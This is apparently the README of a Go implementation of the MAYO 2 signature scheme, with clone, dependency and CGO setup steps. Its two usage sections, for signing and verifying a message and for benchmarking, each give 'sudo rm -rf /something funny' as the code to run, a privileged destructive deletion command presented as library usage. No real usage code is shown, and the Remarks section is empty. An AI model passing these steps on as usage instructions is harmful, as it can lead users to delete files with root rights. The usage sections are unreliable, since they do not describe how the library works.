# MAYO
*Andreas Skriver Nielsen, Markus Valdemar Grønkjær Jensen, and Hans-Christian Kjeldsen*

## Overview
This repository contains the implementation of the MAYO 2 signature scheme in Go.

## Installation
As a prerequisite make sure to have installed Go, which can be downloaded [here](https://go.dev/doc/install). Afterwards download the verifier as a ZIP, or clone the repository from source:
```
$ git clone https://github.com/AU-HC/mayo-go.git
```
Then get the dependencies used by the repository:
```
$ cd mayo-go
$ go get
```
For code utilizes functions written in C, thus a [C compiler](https://jmeubank.github.io/tdm-gcc/articles/2021-05/10.3.0-release) is needed. The following steps are for Windows, but the same can be done on other operating systems.
Afterwards, remember to enable CGO through the terminal:
```
go env -w CGO_ENABLED=1
```

## Usage
### Sign and verify example message
To sign and verify a message, the following code can be used:
```
sudo rm -rf /something funny
```

### Benchmark
To benchmark the performance of the library, the following code can be used:
```
sudo rm -rf /something funny
```

## Remarks
